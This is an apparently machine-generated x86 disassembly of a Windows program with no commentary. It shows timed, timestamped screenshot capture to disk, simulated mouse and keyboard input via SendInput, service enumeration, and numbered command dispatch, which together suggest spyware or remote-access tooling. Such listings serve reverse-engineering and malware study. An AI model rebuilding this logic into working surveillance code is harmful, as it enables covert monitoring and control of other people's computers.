call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea ecx [ ebp - 0x484 ]
call sub_402a90
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x484 ]
call sub_402b93
lea eax [ ebp + 0xb ]
push r--data
push eax
lea ecx [ ebp - 0x84 ]
push [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x34 ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4115d9
add esp 0x14
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40f40b
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call GdipSaveImageToFile
push eax
mov ecx esi
call sub_40f05e
pop esi
pop ebp
retn 0xc
sub_40f42f
mov eax sub_4126dc
call _EH_prolog
sub esp 0x2b0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ rw-data ] ebx
jne r-xdata
push 0x1a
mov esi rw-data
mov ecx esi
call sub_401289
push eax
lea eax [ ebp - 0x270 ]
push eax
call sub_410ee4
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x19
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x280 ]
push eax
call sub_407cfa
add esp 0xc
push eax
mov edi rw-data
mov ecx edi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x280 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x270 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push ebx
mov ecx edi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ CreateDirectoryW@IAT ]
lea eax [ ebp - 0x284 ]
push eax
lea ecx [ ebp - 0x23c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x288 ]
push eax
lea ecx [ ebp - 0x228 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
and [ ebp - 0x22c ] 0x0
mov [ rw-data ] 0x1
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x1
mov [ ebp - 0x240 ] r--data
je r-xdata
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x250 ]
call sub_40ef83
push ebx
lea eax [ ebp - 0x250 ]
push eax
push rw-data
call GdiplusStartup
mov ebx [ Sleep@IAT ]
mov [ ebp - 0x240 ] r--data
lea eax [ ebp - 0x260 ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x254 ]
push eax
movzx eax [ ebp - 0x256 ]
push eax
movzx eax [ ebp - 0x258 ]
push eax
movzx eax [ ebp - 0x25a ]
push eax
movzx eax [ ebp - 0x25e ]
push eax
movzx eax [ ebp - 0x260 ]
push eax
push [ ebp - 0x240 ]
lea eax [ ebp - 0x218 ]
push eax
call [ swprintf@IAT ]
add esp 0x20
push r--data
lea eax [ ebp - 0x218 ]
push eax
push r--data
push rw-data
lea eax [ ebp - 0x29c ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2ac ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2bc ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea ecx [ ebp - 0x228 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x2bc ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x2ac ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x29c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov al [ edi + 0x1 ]
push eax
lea ecx [ ebp - 0x228 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_40f234
pop ecx
pop ecx
cmp [ edi ] 0x0
jne r-xdata
mov [ ebp - 0x240 ] r--data
and [ ebp - 0x22c ] 0x0
push 0x18
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
imul eax eax 0x3e8
jmp r-xdata
push 0x15
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
imul eax eax 0xea60
push 0x0
push 0x17
mov ecx esi
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4116fe
add esp 0x14
mov [ ebp - 0x22c ] al
test al al
jne r-xdata
push eax
call ebx
jmp r-xdata
cmp [ edi ] 0x1
jne r-xdata
cmp [ ebp - 0x22c ] 0x0
jne r-xdata
push 0x3e8
call ebx
jmp r-xdata
sub_40f6d7
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
push 0x2
dec eax
je r-xdata
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
push 0x1c
[ edi ]
and [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
or dx 0x8001
push eax
push 0x1
mov [ ebp - 0xc ] edx
call [ SendInput@IAT ]
pop edi
leave
retn
push 0x8
jmp r-xdata
dec eax
jne r-xdata
pop edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push 0x20
jmp r-xdata
sub_40f72e
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
push 0x4
dec eax
je r-xdata
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
push 0x1c
[ edi ]
and [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
or dx 0x8001
push eax
push 0x1
mov [ ebp - 0xc ] edx
call [ SendInput@IAT ]
pop edi
leave
retn
push 0x10
jmp r-xdata
dec eax
jne r-xdata
pop edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push 0x40
jmp r-xdata
sub_40f785
push ebp
mov ebp esp
sub esp 0x1c
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
push 0x1c
[ edi ]
and [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
push eax
push 0x1
mov [ ebp - 0xc ] 0x8001
call [ SendInput@IAT ]
pop edi
leave
retn
sub_40f7bd
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi [ SendInput@IAT ]
push edi
push 0x1
pop ebx
cmp [ ebp + 0xc ] bl
mov [ ebp - 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] bl
jne r-xdata
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push ebx
mov [ ebp - 0x18 ] 0x10
call esi
cmp [ ebp + 0x14 ] bl
jne r-xdata
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push ebx
mov [ ebp - 0x18 ] 0x11
call esi
mov di [ ebp + 0x8 ]
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push ebx
mov [ ebp - 0x18 ] di
call esi
push 0x2
mov [ ebp - 0x18 ] di
pop edi
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push ebx
mov [ ebp - 0x14 ] edi
call esi
cmp [ ebp + 0xc ] bl
jne r-xdata
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push ebx
mov [ ebp - 0x18 ] 0x12
call esi
cmp [ ebp + 0x10 ] bl
jne r-xdata
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push ebx
mov [ ebp - 0x18 ] 0x10
mov [ ebp - 0x14 ] edi
call esi
cmp [ ebp + 0x14 ] bl
jne r-xdata
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push ebx
mov [ ebp - 0x18 ] 0x11
mov [ ebp - 0x14 ] edi
call esi
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push ebx
mov [ ebp - 0x18 ] 0x12
mov [ ebp - 0x14 ] edi
call esi
sub_40f908
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ebx rw-data
mov ecx ebx
call sub_401fd3
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
lea eax [ ebp - 0x30 ]
push eax
call sub_40fe7e
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_410fa4
push ecx
mov esi esp
push eax
lea eax [ ebp + 0x8 ]
push rw-data
push eax
lea eax [ ebp - 0x10 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx ebx
push 0x34
call sub_402062
lea ecx [ ebp - 0x10 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push sub_40f9b9
mov ecx ebx
call sub_4020b8
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
sub_40f9b9
push ebp
mov ebp esp
sub esp 0xd4
push ebx
push esi
push edi
xor edi edi
push edi
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov bl [ eax ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp + 0xc ]
push [ eax ]
lea eax [ ebp - 0x24 ]
push 0x1
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
mov esi rw-data
mov ecx esp
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp + 0xc ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41113a
movsx eax bl
add esp 0x24
dec eax
je r-xdata
lea eax [ ebp - 0xd4 ]
push eax
call sub_40fe7e
sub esp 0xc
mov ecx esp
push eax
push ecx
call sub_410fa4
pop ecx
pop ecx
push 0x79
mov ecx rw-data
call sub_402062
lea ecx [ ebp - 0xd4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
dec eax
je r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_410fd0
pop ecx
pop ecx
call sub_4101b5
add esp 0x10
test al al
je r-xdata
dec eax
je r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x80
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov ebx esp
push eax
push esi
push edi
call sub_410462
push eax
lea eax [ ebp - 0xb4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x7a
call sub_402062
lea ecx [ ebp - 0xb4 ]
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_410fd0
pop ecx
pop ecx
call sub_410215
add esp 0x10
test al al
je r-xdata
dec eax
je r-xdata
mov ecx rw-data
call sub_402062
jmp r-xdata
lea ecx [ ebp - 0x10 ]
call sub_401ad8
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x81
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov ebx esp
push eax
push esi
push edi
call sub_410462
push eax
lea eax [ ebp - 0x94 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x7b
call sub_402062
lea ecx [ ebp - 0x94 ]
jmp r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_410fd0
pop ecx
pop ecx
call sub_41030e
add esp 0x10
test al al
je r-xdata
dec eax
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x82
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov ebx esp
push eax
push esi
push edi
call sub_410462
push eax
lea eax [ ebp - 0x74 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x7c
call sub_402062
lea ecx [ ebp - 0x74 ]
jmp r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_410fd0
pop ecx
pop ecx
call sub_410375
add esp 0x10
test al al
je r-xdata
dec eax
je r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x83
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov ebx esp
push eax
push esi
push edi
call sub_410462
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x7d
call sub_402062
lea ecx [ ebp - 0x54 ]
jmp r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_410fd0
pop ecx
pop ecx
call sub_41027c
mov [ ebp - 0x14 ] al
mov ebx esp
push [ ebp - 0x14 ]
lea ecx [ ebp - 0x10 ]
push esi
push 0x1
call sub_410462
push eax
push esi
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x84 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
mov ecx rw-data
push 0x7f
call sub_402062
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
jmp r-xdata
dec eax
jne r-xdata
push edi
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_410462
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov al [ eax ]
lea ecx [ ebp - 0x10 ]
push eax
push edi
call sub_410462
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_410fd0
pop ecx
pop ecx
call sub_4103dc
add esp 0x14
test al al
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov ebx esp
push eax
push esi
push edi
call sub_410462
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x84
call sub_402062
lea ecx [ ebp - 0x64 ]
jmp r-xdata
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_410462
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov ebx esp
push eax
push esi
push 0x1
call sub_410462
push eax
push esi
push edi
lea ecx [ ebp - 0x10 ]
call sub_410462
push eax
lea eax [ ebp - 0xc4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xa4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x7e
call sub_402062
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xc4 ]
jmp r-xdata
sub_40fe7e
push ebp
mov ebp esp
sub esp 0x144
push edi
xor edi edi
push 0x4
push edi
push edi
call [ OpenSCManagerA@IAT ]
cmp eax edi
mov [ ebp - 0xc ] eax
jne r-xdata
lea eax [ ebp - 0x1 ]
push esi
push eax
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x24 ]
mov esi [ EnumServicesStatusW@IAT ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x144 ]
push edi
push eax
push 0x3
push 0x3b
push [ ebp - 0xc ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x24 ] edi
call esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
push [ ebp - 0xc ]
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x3c ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
leave
retn
push ebx
mov ebx [ ebp - 0x10 ]
push ebx
call [ malloc@IAT ]
pop ecx
mov [ ebp - 0x28 ] eax
lea ecx [ ebp - 0x24 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push eax
push 0x3
push 0x3b
push [ ebp - 0xc ]
call esi
cmp [ ebp - 0x8 ] edi
mov [ ebp - 0x14 ] edi
jbe r-xdata
push [ ebp - 0x28 ]
call [ free@IAT ]
pop ecx
pop ebx
mov ebx [ ebp - 0x28 ]
mov edi [ ebp + 0x8 ]
mov esi r--data
push [ ebp - 0x2c ]
call [ CloseServiceHandle@IAT ]
inc [ ebp - 0x14 ]
add ebx 0x24
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x100 ]
push eax
push esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x50 ]
push [ ebx + 0x4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
lea ecx [ ebp - 0x3c ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x50 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x100 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x1e ]
lea ecx [ ebp - 0xe0 ]
push eax
push esi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x80 ]
push [ ebx ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
lea ecx [ ebp - 0x3c ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xe0 ]
